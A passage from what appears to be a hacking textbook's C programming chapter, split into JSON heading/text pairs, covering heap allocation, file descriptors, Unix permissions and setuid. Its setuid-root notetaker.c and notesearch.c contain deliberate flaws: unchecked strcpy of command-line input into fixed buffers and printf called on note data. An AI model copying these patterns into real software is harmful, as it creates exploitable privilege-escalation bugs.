int_ptr. The heap allocation functions control this\nbehavior, which can be explored by changing the size of the initial memory\nallocation.\nreader@hacking:~/booksrc $ ./heap_example 100\n[+] allocating 100 bytes of memory on the heap for char_ptr\nchar_ptr (0x804a008) --> 'This is memory is located on the heap.'\n[+] allocating 12 bytes of memory on the heap for int_ptr\nint_ptr (0x804a070) --> 31337\n[-] freeing char_ptr's heap memory...\n[+] allocating another 15 bytes for char_ptr\nchar_ptr (0x804a008) --> 'new memory'\n[-] freeing int_ptr's heap memory...\n[-] freeing char_ptr's heap memory...\nreader@hacking:~/booksrc $\nIf a larger block of memory is allocated and then deallocated, the final\n15-byte allocation will occur in that freed memory space, instead. By experi-\nmenting with different values, you can figure out exactly when the allocation\nProgramming 79"
  },
  {
    "input": "0x273 Error-Checked malloc()",
    "output": "function chooses to reclaim freed space for new allocations. Often, simple\ninformative printf() statements and a little experimentation can reveal many\nthings about the underlying system.\n0x273 Error-Checked malloc()\nIn heap_example.c, there were several error checks for the malloc() calls.\nEven though the malloc() calls never failed, it’s important to handle all\npotential cases when coding in C. But with multiple malloc() calls, this error-\nchecking code needs to appear in multiple places. This usually makes the\ncode look sloppy, and it’s inconvenient if changes need to be made to the\nerror-checking code or if new malloc() calls are needed. Since all the error-\nchecking code is basically the same for every malloc() call, this is a perfect\nplace to use a function instead of repeating the same instructions in multiple\nplaces. Take a look at errorchecked_heap.c for an example.\nerrorchecked_heap.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid *errorchecked_malloc(unsigned int); // Function prototype for errorchecked_malloc()\nint main(int argc, char *argv[]) {\nchar *char_ptr; // A char pointer\nint *int_ptr; // An integer pointer\nint mem_size;\nif (argc < 2) // If there aren't command-line arguments,\nmem_size = 50; // use 50 as the default value.\nelse\nmem_size = atoi(argv[1]);\nprintf(\"\\t[+] allocating %d bytes of memory on the heap for char_ptr\\n\", mem_size);\nchar_ptr = (char *) errorchecked_malloc(mem_size); // Allocating heap memory\nstrcpy(char_ptr, \"This is memory is located on the heap.\");\nprintf(\"char_ptr (%p) --> '%s'\\n\", char_ptr, char_ptr);\nprintf(\"\\t[+] allocating 12 bytes of memory on the heap for int_ptr\\n\");\nint_ptr = (int *) errorchecked_malloc(12); // Allocated heap memory again\n*int_ptr = 31337; // Put the value of 31337 where int_ptr is pointing.\nprintf(\"int_ptr (%p) --> %d\\n\", int_ptr, *int_ptr);\nprintf(\"\\t[-] freeing char_ptr's heap memory...\\n\");\nfree(char_ptr); // Freeing heap memory\nprintf(\"\\t[+] allocating another 15 bytes for char_ptr\\n\");\nchar_ptr = (char *) errorchecked_malloc(15); // Allocating more heap memory\nstrcpy(char_ptr, \"new memory\");\n80 0x200"
  },
  {
    "input": "0x281 File Access",
    "output": "printf(\"char_ptr (%p) --> '%s'\\n\", char_ptr, char_ptr);\nprintf(\"\\t[-] freeing int_ptr's heap memory...\\n\");\nfree(int_ptr); // Freeing heap memory\nprintf(\"\\t[-] freeing char_ptr's heap memory...\\n\");\nfree(char_ptr); // Freeing the other block of heap memory\n}\nvoid *errorchecked_malloc(unsigned int size) { // An error-checked malloc() function\nvoid *ptr;\nptr = malloc(size);\nif(ptr == NULL) {\nfprintf(stderr, \"Error: could not allocate heap memory.\\n\");\nexit(-1);\n}\nreturn ptr;\n}\nThe errorchecked_heap.c program is basically equivalent to the\nprevious heap_example.c code, except the heap memory allocation and\nerror checking has been gathered into a single function. The first line of code\n[void *errorchecked_malloc(unsigned int);] is the function prototype. This lets\nthe compiler know that there will be a function called errorchecked_malloc() that\nexpects a single, unsigned integer argument and returns a void pointer. The\nactual function can then be anywhere; in this case it is after the main() func-\ntion. The function itself is quite simple; it just accepts the size in bytes to\nallocate and attempts to allocate that much memory using malloc(). If the\nallocation fails, the error-checking code displays an error and the program\nexits; otherwise, it returns the pointer to the newly allocated heap memory.\nThis way, the custom errorchecked_malloc() function can be used in place of\nanormal malloc(), eliminating the need for repetitious error checking after-\nward. This should begin to highlight the usefulness of programming with\nfunctions.\n0x280 Building on Basics\nOnce you understand the basic concepts of C programming, the rest is pretty\neasy. The bulk of the power of C comes from using other functions. In fact,\nif the functions were removed from any of the preceding programs, all that\nwould remain are very basic statements.\n0x281 File Access\nThere are two primary ways to access files in C: file descriptors and file-\nstreams. File descriptors use a set of low-level I/O functions, and filestreams are\nahigher-level form of buffered I/O that is built on the lower-level functions.\nSome consider the filestream functions easier to program with; however, file\ndescriptors are more direct. In this book, the focus will be on the low-level\nI/O functions that use file descriptors.\nProgramming 81\nThe bar code on the back of this book represents a number. Because this\nnumber is unique among the other books in a bookstore, the cashier can\nscan the number at checkout and use it to reference information about this\nbook in the store’s database. Similarly, a file descriptor is a number that is\nused to reference open files. Four common functions that use file descriptors\nare open(), close(), read(), and write(). All of these functions will return −1 if\nthere is an error. The open() function opens a file for reading and/or writing\nand returns a file descriptor. The returned file descriptor is just an integer\nvalue, but it is unique among open files. The file descriptor is passed as an\nargument to the other functions like a pointer to the opened file. For the\nclose() function, the file descriptor is the only argument. The read() and\nwrite() functions’ arguments are the file descriptor, a pointer to the data to\nread or write, and the number of bytes to read or write from that location.\nThe arguments to the open() function are a pointer to the filename to open\nand a series of predefined flags that specify the access mode. These flags and\ntheir usage will be explained in depth later, but for now let’s take a look at a\nsimple note-taking program that uses file descriptors—simplenote.c. This\nprogram accepts a note as a command-line argument and then adds it to the\nend of the file /tmp/notes. This program uses several functions, including a\nfamiliar looking error-checked heap memory allocation function. Other func-\ntions are used to display a usage message and to handle fatal errors. The\nusage() function is simply defined before main(), so it doesn’t need a function\nprototype.\nsimplenote.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/stat.h>\nvoid usage(char *prog_name, char *filename) {\nprintf(\"Usage: %s <data to add to %s>\\n\", prog_name, filename);\nexit(0);\n}\nvoid fatal(char *); // A function for fatal errors\nvoid *ec_malloc(unsigned int); // An error-checked malloc() wrapper\nint main(int argc, char *argv[]) {\nint fd; // file descriptor\nchar *buffer, *datafile;\nbuffer = (char *) ec_malloc(100);\ndatafile = (char *) ec_malloc(20);\nstrcpy(datafile, \"/tmp/notes\");\nif(argc < 2) // If there aren't command-line arguments,\nusage(argv[0], datafile); // display usage message and exit.\n82 0x200\nstrcpy(buffer, argv[1]); // Copy into buffer.\nprintf(\"[DEBUG] buffer @ %p: \\'%s\\'\\n\", buffer, buffer);\nprintf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\nstrncat(buffer, \"\\n\", 1); // Add a newline on the end.\n// Opening file\nfd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nif(fd == -1)\nfatal(\"in main() while opening file\");\nprintf(\"[DEBUG] file descriptor is %d\\n\", fd);\n// Writing data\nif(write(fd, buffer, strlen(buffer)) == -1)\nfatal(\"in main() while writing buffer to file\");\n// Closing file\nif(close(fd) == -1)\nfatal(\"in main() while closing file\");\nprintf(\"Note has been saved.\\n\");\nfree(buffer);\nfree(datafile);\n}\n// A function to display an error message and then exit\nvoid fatal(char *message) {\nchar error_message[100];\nstrcpy(error_message, \"[!!] Fatal Error \");\nstrncat(error_message, message, 83);\nperror(error_message);\nexit(-1);\n}\n// An error-checked malloc() wrapper function\nvoid *ec_malloc(unsigned int size) {\nvoid *ptr;\nptr = malloc(size);\nif(ptr == NULL)\nfatal(\"in ec_malloc() on memory allocation\");\nreturn ptr;\n}\nBesides the strange-looking flags used in the open() function, most of this\ncode should be readable. There are also a few standard functions that we\nhaven’t used before. The strlen() function accepts a string and returns its\nlength. It’s used in combination with the write() function, since it needs to\nknow how many bytes to write. The perror() function is short for print error and is\nused in fatal() to print an additional error message (if it exists) before exiting.\nreader@hacking:~/booksrc $ gcc -o simplenote simplenote.c\nreader@hacking:~/booksrc $ ./simplenote\nUsage: ./simplenote <data to add to /tmp/notes>\nProgramming 83\nreader@hacking:~/booksrc $ ./simplenote \"this is a test note\"\n[DEBUG] buffer @ 0x804a008: 'this is a test note'\n[DEBUG] datafile @ 0x804a070: '/tmp/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ cat /tmp/notes\nthis is a test note\nreader@hacking:~/booksrc $ ./simplenote \"great, it works\"\n[DEBUG] buffer @ 0x804a008: 'great, it works'\n[DEBUG] datafile @ 0x804a070: '/tmp/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ cat /tmp/notes\nthis is a test note\ngreat, it works\nreader@hacking:~/booksrc $\nThe output of the program’s execution is pretty self-explanatory, but\nthere are some things about the source code that need further explanation.\nThe files fcntl.h and sys/stat.h had to be included, since those files define the\nflags used with the open() function. The first set of flags is found in fcntl.h\nand is used to set the access mode. The access mode must use at least one of\nthe following three flags:\nO_RDONLY Open file for read-only access.\nO_WRONLY Open file for write-only access.\nO_RDWR Open file for both read and write access.\nThese flags can be combined with several other optional flags using the\nbitwise OR operator. A few of the more common and useful of these flags are\nas follows:\nO_APPEND Write data at the end of the file.\nO_TRUNC If the file already exists, truncate the file to 0 length.\nO_CREAT Create the file if it doesn’t exist.\nBitwise operations combine bits using standard logic gates such as OR and\nAND. When two bits enter an OR gate, the result is 1 if either the first bit or the\nsecond bit is 1. If two bits enter an AND gate, the result is 1 only if both the first\nbit and the second bit are 1. Full 32-bit values can use these bitwise operators to\nperform logic operations on each corresponding bit. The source code of\nbitwise.c and the program output demonstrate these bitwise operations.\nbitwise.c\n#include <stdio.h>\nint main() {\nint i, bit_a, bit_b;\nprintf(\"bitwise OR operator |\\n\");\n84 0x200\nfor(i=0; i < 4; i++) {\nbit_a = (i & 2) / 2; // Get the second bit.\nbit_b = (i & 1); // Get the first bit.\nprintf(\"%d | %d = %d\\n\", bit_a, bit_b, bit_a | bit_b);\n}\nprintf(\"\\nbitwise AND operator &\\n\");\nfor(i=0; i < 4; i++) {\nbit_a = (i & 2) / 2; // Get the second bit.\nbit_b = (i & 1); // Get the first bit.\nprintf(\"%d & %d = %d\\n\", bit_a, bit_b, bit_a & bit_b);\n}\n}\nThe results of compiling and executing bitwise.c are as follows.\nreader@hacking:~/booksrc $ gcc bitwise.c\nreader@hacking:~/booksrc $ ./a.out\nbitwise OR operator |\n0 | 0 = 0\n0 | 1 = 1\n1 | 0 = 1\n1 | 1 = 1\nbitwise AND operator &\n0 & 0 = 0\n0 & 1 = 0\n1 & 0 = 0\n1 & 1 = 1\nreader@hacking:~/booksrc $\nThe flags used for the open() function have values that correspond to\nsingle bits. This way, flags can be combined using OR logic without destroy-\ning any information. The fcntl_flags.c program and its output explore some\nof the flag values defined by fcntl.h and how they combine with each other.\nfcntl_flags.c\n#include <stdio.h>\n#include <fcntl.h>\nvoid display_flags(char *, unsigned int);\nvoid binary_print(unsigned int);\nint main(int argc, char *argv[]) {\ndisplay_flags(\"O_RDONLY\\t\\t\", O_RDONLY);\ndisplay_flags(\"O_WRONLY\\t\\t\", O_WRONLY);\ndisplay_flags(\"O_RDWR\\t\\t\\t\", O_RDWR);\nprintf(\"\\n\");\ndisplay_flags(\"O_APPEND\\t\\t\", O_APPEND);\ndisplay_flags(\"O_TRUNC\\t\\t\\t\", O_TRUNC);\ndisplay_flags(\"O_CREAT\\t\\t\\t\", O_CREAT);\nProgramming 85\nprintf(\"\\n\");\ndisplay_flags(\"O_WRONLY|O_APPEND|O_CREAT\", O_WRONLY|O_APPEND|O_CREAT);\n}\nvoid display_flags(char *label, unsigned int value) {\nprintf(\"%s\\t: %d\\t:\", label, value);\nbinary_print(value);\nprintf(\"\\n\");\n}\nvoid binary_print(unsigned int value) {\nunsigned int mask = 0xff000000; // Start with a mask for the highest byte.\nunsigned int shift = 256*256*256; // Start with a shift for the highest byte.\nunsigned int byte, byte_iterator, bit_iterator;\nfor(byte_iterator=0; byte_iterator < 4; byte_iterator++) {\nbyte = (value & mask) / shift; // Isolate each byte.\nprintf(\" \");\nfor(bit_iterator=0; bit_iterator < 8; bit_iterator++) { // Print the byte's bits.\nif(byte & 0x80) // If the highest bit in the byte isn't 0,\nprintf(\"1\"); // print a 1.\nelse\nprintf(\"0\"); // Otherwise, print a 0.\nbyte *= 2; // Move all the bits to the left by 1.\n}\nmask /= 256; // Move the bits in mask right by 8.\nshift /= 256; // Move the bits in shift right by 8.\n}\n}\nThe results of compiling and executing fcntl_flags.c are as follows.\nreader@hacking:~/booksrc $ gcc fcntl_flags.c\nreader@hacking:~/booksrc $ ./a.out\nO_RDONLY : 0 : 00000000 00000000 00000000 00000000\nO_WRONLY : 1 : 00000000 00000000 00000000 00000001\nO_RDWR : 2 : 00000000 00000000 00000000 00000010\nO_APPEND : 1024 : 00000000 00000000 00000100 00000000\nO_TRUNC : 512 : 00000000 00000000 00000010 00000000\nO_CREAT : 64 : 00000000 00000000 00000000 01000000\nO_WRONLY|O_APPEND|O_CREAT : 1089 : 00000000 00000000 00000100 01000001\n$\nUsing bit flags in combination with bitwise logic is an efficient and com-\nmonly used technique. As long as each flag is a number that only has unique\nbits turned on, the effect of doing a bitwise OR on these values is the same as\nadding them. In fcntl_flags.c, 1 + 1024 + 64 = 1089. This technique only works\nwhen all the bits are unique, though.\n86 0x200"
  },
  {
    "input": "0x282 File Permissions",
    "output": "0x282 File Permissions\nIf the O_CREAT flag is used in access mode for the open() function, an additional\nargument is needed to define the file permissions of the newly created file.\nThis argument uses bit flags defined in sys/stat.h, which can be combined\nwith each other using bitwise OR logic.\nS_IRUSR Give the file read permission for the user (owner).\nS_IWUSR Give the file write permission for the user (owner).\nS_IXUSR Give the file execute permission for the user (owner).\nS_IRGRP Give the file read permission for the group.\nS_IWGRP Give the file write permission for the group.\nS_IXGRP Give the file execute permission for the group.\nS_IROTH Give the file read permission for other (anyone).\nS_IWOTH Give the file write permission for other (anyone).\nS_IXOTH Give the file execute permission for other (anyone).\nIf you are already familiar with Unix file permissions, those flags should\nmake perfect sense to you. If they don’t make sense, here’s a crash course in\nUnix file permissions.\nEvery file has an owner and a group. These values can be displayed using\nls -l and are shown below in the following output.\nreader@hacking:~/booksrc $ ls -l /etc/passwd simplenote*\n-rw-r--r-- 1 root root 1424 2007-09-06 09:45 /etc/passwd\n-rwxr-xr-x 1 reader reader 8457 2007-09-07 02:51 simplenote\n-rw------- 1 reader reader 1872 2007-09-07 02:51 simplenote.c\nreader@hacking:~/booksrc $\nFor the /etc/passwd file, the owner is root and the group is also root. For\nthe other two simplenote files, the owner is reader and the group is users.\nRead, write, and execute permissions can be turned on and off for three\ndifferent fields: user, group, and other. User permissions describe what the\nowner of the file can do (read, write, and/or execute), group permissions\ndescribe what users in that group can do, and other permissions describe\nwhat everyone else can do. These fields are also displayed in the front of the\nls -l output. First, the user read/write/execute permissions are displayed,\nusing r for read, w for write, x for execute, and - for off. The next three\ncharacters display the group permissions, and the last three characters are\nfor the other permissions. In the output above, the simplenote program has\nall three user permissions turned on (shown in bold). Each permission cor-\nresponds to a bit flag; read is 4 (100 in binary), write is 2 (010 in binary), and\nexecute is 1 (001 in binary). Since each value only contains unique bits,\nabitwise OR operation achieves the same result as adding these numbers\ntogether does. These values can be added together to define permissions for\nuser, group, and other using the chmod command.\nProgramming 87"
  },
  {
    "input": "0x283 User IDs",
    "output": "reader@hacking:~/booksrc $ chmod 731 simplenote.c\nreader@hacking:~/booksrc $ ls -l simplenote.c\n-rwx-wx--x 1 reader reader 1826 2007-09-07 02:51 simplenote.c\nreader@hacking:~/booksrc $ chmod ugo-wx simplenote.c\nreader@hacking:~/booksrc $ ls -l simplenote.c\n-r-------- 1 reader reader 1826 2007-09-07 02:51 simplenote.c\nreader@hacking:~/booksrc $ chmod u+w simplenote.c\nreader@hacking:~/booksrc $ ls -l simplenote.c\n-rw------- 1 reader reader 1826 2007-09-07 02:51 simplenote.c\nreader@hacking:~/booksrc $\nThe first command (chmod 721) gives read, write, and execute permissions to\nthe user, since the first number is 7 (4 + 2 + 1), write and execute permissions\nto group, since the second number is 3 (2 + 1), and only execute permis-\nsion to other, since the third number is 1. Permissions can also be added or\nsubtracted using chmod. In the next chmod command, the argument ugo-wx\nmeans Subtract write and execute permissions from user, group, and other. The final\nchmod u+w command gives write permission to user.\nIn the simplenote program, the open() function uses S_IRUSR|S_IWUSR for\nits additional permission argument, which means the /tmp/notes file should\nonly have user read and write permission when it is created.\nreader@hacking:~/booksrc $ ls -l /tmp/notes\n-rw------- 1 reader reader 36 2007-09-07 02:52 /tmp/notes\nreader@hacking:~/booksrc $\n0x283 User IDs\nEvery user on a Unix system has a unique user ID number. This user ID can\nbe displayed using the id command.\nreader@hacking:~/booksrc $ id reader\nuid=999(reader) gid=999(reader)\ngroups=999(reader),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),4\n4(video),46(plugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(a\ndmin)\nreader@hacking:~/booksrc $ id matrix\nuid=500(matrix) gid=500(matrix) groups=500(matrix)\nreader@hacking:~/booksrc $ id root\nuid=0(root) gid=0(root) groups=0(root)\nreader@hacking:~/booksrc $\nThe root user with user ID 0 is like the administrator account, which has\nfull access to the system. The su command can be used to switch to a differ-\nent user, and if this command is run as root, it can be done without a pass-\nword. The sudo command allows a single command to be run as the root user.\nOn the LiveCD, sudo has been configured so it can be executed without a pass-\nword, for simplicity’s sake. These commands provide a simple method to\nquickly switch between users.\n88 0x200\nreader@hacking:~/booksrc $ sudo su jose\njose@hacking:/home/reader/booksrc $ id\nuid=501(jose) gid=501(jose) groups=501(jose)\njose@hacking:/home/reader/booksrc $\nAs the user jose, the simplenote program will run as jose if it is executed,\nbut it won’t have access to the /tmp/notes file. This file is owned by the user\nreader, and it only allows read and write permission to its owner.\njose@hacking:/home/reader/booksrc $ ls -l /tmp/notes\n-rw------- 1 reader reader 36 2007-09-07 05:20 /tmp/notes\njose@hacking:/home/reader/booksrc $ ./simplenote \"a note for jose\"\n[DEBUG] buffer @ 0x804a008: 'a note for jose'\n[DEBUG] datafile @ 0x804a070: '/tmp/notes'\n[!!] Fatal Error in main() while opening file: Permission denied\njose@hacking:/home/reader/booksrc $ cat /tmp/notes\ncat: /tmp/notes: Permission denied\njose@hacking:/home/reader/booksrc $ exit\nexit\nreader@hacking:~/booksrc $\nThis is fine if reader is the only user of the simplenote program; however,\nthere are many times when multiple users need to be able to access certain\nportions of the same file. For example, the /etc/passwd file contains account\ninformation for every user on the system, including each user’s default login\nshell. The command chsh allows any user to change his or her own login shell.\nThis program needs to be able to make changes to the /etc/passwd file, but\nonly on the line that pertains to the current user’s account. The solution to\nthis problem in Unix is the set user ID (setuid) permission. This is an addi-\ntional file permission bit that can be set using chmod. When a program with\nthis flag is executed, it runs as the user ID of the file’s owner.\nreader@hacking:~/booksrc $ which chsh\n/usr/bin/chsh\nreader@hacking:~/booksrc $ ls -l /usr/bin/chsh /etc/passwd\n-rw-r--r-- 1 root root 1424 2007-09-06 21:05 /etc/passwd\n-rwsr-xr-x 1 root root 23920 2006-12-19 20:35 /usr/bin/chsh\nreader@hacking:~/booksrc $\nThe chsh program has the setuid flag set, which is indicated by an s in the\nls output above. Since this file is owned by root and has the setuid permission\nset, the program will run as the root user when any user runs this program.\nThe /etc/passwd file that chsh writes to is also owned by root and only allows\nthe owner to write to it. The program logic in chsh is designed to only allow\nwriting to the line in /etc/passwd that corresponds to the user running the\nprogram, even though the program is effectively running as root. This\nmeans that a running program has both a real user ID and an effective user\nID.These IDs can be retrieved using the functions getuid() and geteuid(),\nrespectively, as shown in uid_demo.c.\nProgramming 89\nuid_demo.c\n#include <stdio.h>\nint main() {\nprintf(\"real uid: %d\\n\", getuid());\nprintf(\"effective uid: %d\\n\", geteuid());\n}\nThe results of compiling and executing uid_demo.c are as follows.\nreader@hacking:~/booksrc $ gcc -o uid_demo uid_demo.c\nreader@hacking:~/booksrc $ ls -l uid_demo\n-rwxr-xr-x 1 reader reader 6825 2007-09-07 05:32 uid_demo\nreader@hacking:~/booksrc $ ./uid_demo\nreal uid: 999\neffective uid: 999\nreader@hacking:~/booksrc $ sudo chown root:root ./uid_demo\nreader@hacking:~/booksrc $ ls -l uid_demo\n-rwxr-xr-x 1 root root 6825 2007-09-07 05:32 uid_demo\nreader@hacking:~/booksrc $ ./uid_demo\nreal uid: 999\neffective uid: 999\nreader@hacking:~/booksrc $\nIn the output for uid_demo.c, both user IDs are shown to be 999 when\nuid_demo is executed, since 999 is the user ID for reader. Next, the sudo com-\nmand is used with the chown command to change the owner and group of\nuid_demo to root. The program can still be executed, since it has execute\npermission for other, and it shows that both user IDs remain 999, since\nthat’s still the ID of the user.\nreader@hacking:~/booksrc $ chmod u+s ./uid_demo\nchmod: changing permissions of `./uid_demo': Operation not permitted\nreader@hacking:~/booksrc $ sudo chmod u+s ./uid_demo\nreader@hacking:~/booksrc $ ls -l uid_demo\n-rwsr-xr-x 1 root root 6825 2007-09-07 05:32 uid_demo\nreader@hacking:~/booksrc $ ./uid_demo\nreal uid: 999\neffective uid: 0\nreader@hacking:~/booksrc $\nSince the program is owned by root now, sudo must be used to change\nfile permissions on it. The chmod u+s command turns on the setuid permis-\nsion, which can be seen in the following ls -l output. Now when the user\nreader executes uid_demo, the effective user ID is 0 for root, which means the\nprogram can access files as root. This is how the chsh program is able to allow\nany user to change his or her login shell stored in /etc/passwd.\n90 0x200\nThis same technique can be used in a multiuser note-taking program.\nThe next program will be a modification of the simplenote program; it will\nalso record the user ID of each note’s original author. In addition, a new\nsyntax for #include will be introduced.\nThe ec_malloc() and fatal() functions have been useful in many of our\nprograms. Rather than copy and paste these functions into each program,\nthey can be put in a separate include file.\nhacking.h\n// A function to display an error message and then exit\nvoid fatal(char *message) {\nchar error_message[100];\nstrcpy(error_message, \"[!!] Fatal Error \");\nstrncat(error_message, message, 83);\nperror(error_message);\nexit(-1);\n}\n// An error-checked malloc() wrapper function\nvoid *ec_malloc(unsigned int size) {\nvoid *ptr;\nptr = malloc(size);\nif(ptr == NULL)\nfatal(\"in ec_malloc() on memory allocation\");\nreturn ptr;\n}\nIn this new program, hacking.h, the functions can just be included. In C,\nwhen the filename for a #include is surrounded by < and >, the compiler looks\nfor this file in standard include paths, such as /usr/include/. If the filename\nis surrounded by quotes, the compiler looks in the current directory. There-\nfore, if hacking.h is in the same directory as a program, it can be included\nwith that program by typing #include \"hacking.h\".\nThe changed lines for the new notetaker program (notetaker.c) are\ndisplayed in bold.\nnotetaker.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include \"hacking.h\"\nvoid usage(char *prog_name, char *filename) {\nprintf(\"Usage: %s <data to add to %s>\\n\", prog_name, filename);\nexit(0);\nProgramming 91\n}\nvoid fatal(char *); // A function for fatal errors\nvoid *ec_malloc(unsigned int); // An error-checked malloc() wrapper\nint main(int argc, char *argv[]) {\nint userid, fd; // File descriptor\nchar *buffer, *datafile;\nbuffer = (char *) ec_malloc(100);\ndatafile = (char *) ec_malloc(20);\nstrcpy(datafile, \"/var/notes\");\nif(argc < 2) // If there aren't command-line arguments,\nusage(argv[0], datafile); // display usage message and exit.\nstrcpy(buffer, argv[1]); // Copy into buffer.\nprintf(\"[DEBUG] buffer @ %p: \\'%s\\'\\n\", buffer, buffer);\nprintf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\n// Opening the file\nfd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nif(fd == -1)\nfatal(\"in main() while opening file\");\nprintf(\"[DEBUG] file descriptor is %d\\n\", fd);\nuserid = getuid(); // Get the real user ID.\n// Writing data\nif(write(fd, &userid, 4) == -1) // Write user ID before note data.\nfatal(\"in main() while writing userid to file\");\nwrite(fd, \"\\n\", 1); // Terminate line.\nif(write(fd, buffer, strlen(buffer)) == -1) // Write note.\nfatal(\"in main() while writing buffer to file\");\nwrite(fd, \"\\n\", 1); // Terminate line.\n// Closing file\nif(close(fd) == -1)\nfatal(\"in main() while closing file\");\nprintf(\"Note has been saved.\\n\");\nfree(buffer);\nfree(datafile);\n}\nThe output file has been changed from /tmp/notes to /var/notes, so the\ndata is now stored in a more permanent place. The getuid() function is used to\nget the real user ID, which is written to the datafile on the line before the note’s\nline is written. Since the write() function is expecting a pointer for its source,\nthe & operator is used on the integer value userid to provide its address.\n92 0x200\nreader@hacking:~/booksrc $ gcc -o notetaker notetaker.c\nreader@hacking:~/booksrc $ sudo chown root:root ./notetaker\nreader@hacking:~/booksrc $ sudo chmod u+s ./notetaker\nreader@hacking:~/booksrc $ ls -l ./notetaker\n-rwsr-xr-x 1 root root 9015 2007-09-07 05:48 ./notetaker\nreader@hacking:~/booksrc $ ./notetaker \"this is a test of multiuser notes\"\n[DEBUG] buffer @ 0x804a008: 'this is a test of multiuser notes'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ ls -l /var/notes\n-rw------- 1 root reader 39 2007-09-07 05:49 /var/notes\nreader@hacking:~/booksrc $\nIn the preceding output, the notetaker program is compiled and changed\nto be owned by root, and the setuid permission is set. Now when the program\nis executed, the program runs as the root user, so the file /var/notes is also\nowned by root when it is created.\nreader@hacking:~/booksrc $ cat /var/notes\ncat: /var/notes: Permission denied\nreader@hacking:~/booksrc $ sudo cat /var/notes\n?\nthis is a test of multiuser notes\nreader@hacking:~/booksrc $ sudo hexdump -C /var/notes\n00000000 e7 03 00 00 0a 74 68 69 73 20 69 73 20 61 20 74 |.....this is a t|\n00000010 65 73 74 20 6f 66 20 6d 75 6c 74 69 75 73 65 72 |est of multiuser|\n00000020 20 6e 6f 74 65 73 0a | notes.|\n00000027\nreader@hacking:~/booksrc $ pcalc 0x03e7\n999 0x3e7 0y1111100111\nreader@hacking:~/booksrc $\nThe /var/notes file contains the user ID of reader (999) and the note.\nBecause of little-endian architecture, the 4 bytes of the integer 999 appear\nreversed in hexadecimal (shown in bold above).\nIn order for a normal user to be able to read the note data, a correspond-\ning setuid root program is needed. The notesearch.c program will read the\nnote data and only display the notes written by that user ID. Additionally, an\noptional command-line argument can be supplied for a search string. When\nthis is used, only notes matching the search string will be displayed.\nnotesearch.c\n#include <stdio.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include \"hacking.h\"\nProgramming 93\n#define FILENAME \"/var/notes\"\nint print_notes(int, int, char *); // Note printing function.\nint find_user_note(int, int); // Seek in file for a note for user.\nint search_note(char *, char *); // Search for keyword function.\nvoid fatal(char *); // Fatal error handler\nint main(int argc, char *argv[]) {\nint userid, printing=1, fd; // File descriptor\nchar searchstring[100];\nif(argc > 1) // If there is an arg,\nstrcpy(searchstring, argv[1]); // that is the search string;\nelse // otherwise,\nsearchstring[0] = 0; // search string is empty.\nuserid = getuid();\nfd = open(FILENAME, O_RDONLY); // Open the file for read-only access.\nif(fd == -1)\nfatal(\"in main() while opening file for reading\");\nwhile(printing)\nprinting = print_notes(fd, userid, searchstring);\nprintf(\"-------[ end of note data ]-------\\n\");\nclose(fd);\n}\n// A function to print the notes for a given uid that match\n// an optional search string;\n// returns 0 at end of file, 1 if there are still more notes.\nint print_notes(int fd, int uid, char *searchstring) {\nint note_length;\nchar byte=0, note_buffer[100];\nnote_length = find_user_note(fd, uid);\nif(note_length == -1) // If end of file reached,\nreturn 0; // return 0.\nread(fd, note_buffer, note_length); // Read note data.\nnote_buffer[note_length] = 0; // Terminate the string.\nif(search_note(note_buffer, searchstring)) // If searchstring found,\nprintf(note_buffer); // print the note.\nreturn 1;\n}\n// A function to find the next note for a given userID;\n// returns -1 if the end of the file is reached;\n// otherwise, it returns the length of the found note.\nint find_user_note(int fd, int user_uid) {\nint note_uid=-1;\nunsigned char byte;\nint length;\nwhile(note_uid != user_uid) { // Loop until a note for user_uid is found.\n94 0x200\nif(read(fd, &note_uid, 4) != 4) // Read the uid data.\nreturn -1; // If 4 bytes aren't read, return end of file code.\nif(read(fd, &byte, 1) != 1) // Read the newline separator.\nreturn -1;\nbyte = length = 0;\nwhile(byte != '\\n') { // Figure out how many bytes to the end of line.\nif(read(fd, &byte, 1) != 1) // Read a single byte.\nreturn -1; // If byte isn't read, return end of file code.\nlength++;\n}\n}\nlseek(fd, length * -1, SEEK_CUR); // Rewind file reading by length bytes.\nprintf(\"[DEBUG] found a %d byte note for user id %d\\n\", length, note_uid);\nreturn length;\n}\n// A function to search a note for a given keyword;\n// returns 1 if a match is found, 0 if there is no match.\nint search_note(char *note, char *keyword) {\nint i, keyword_length, match=0;\nkeyword_length = strlen(keyword);\nif(keyword_length == 0) // If there is no search string,\nreturn 1; // always \"match\".\nfor(i=0; i < strlen(note); i++) { // Iterate over bytes in note.\nif(note[i] == keyword[match]) // If byte matches keyword,\nmatch++; // get ready to check the next byte;\nelse { // otherwise,\nif(note[i] == keyword[0]) // if that byte matches first keyword byte,\nmatch = 1; // start the match count at 1.\nelse\nmatch = 0; // Otherwise it is zero.\n}\nif(match == keyword_length) // If there is a full match,\nreturn 1; // return matched.\n}\nreturn 0; // Return not matched.\n}\nMost of this code should make sense, but there are some new concepts.\nThe filename is defined at the top instead of using heap memory. Also, the\nfunction lseek() is used to rewind the read position in the file. The function\ncall of lseek(fd, length * -1, SEEK_CUR); tells the program to move the read\nposition forward from the current position in the file by length * -1 bytes.\nSince this turns out to be a negative number, the position is moved backward\nby length bytes.\nreader@hacking:~/booksrc $ gcc -o notesearch notesearch.c\nreader@hacking:~/booksrc $ sudo chown root:root ./notesearch\nreader@hacking:~/booksrc $ sudo chmod u+s ./notesearch\nreader@hacking:~/booksrc $ ./notesearch\nProgramming 95"
  },
  {
    "input": "0x284 Structs",
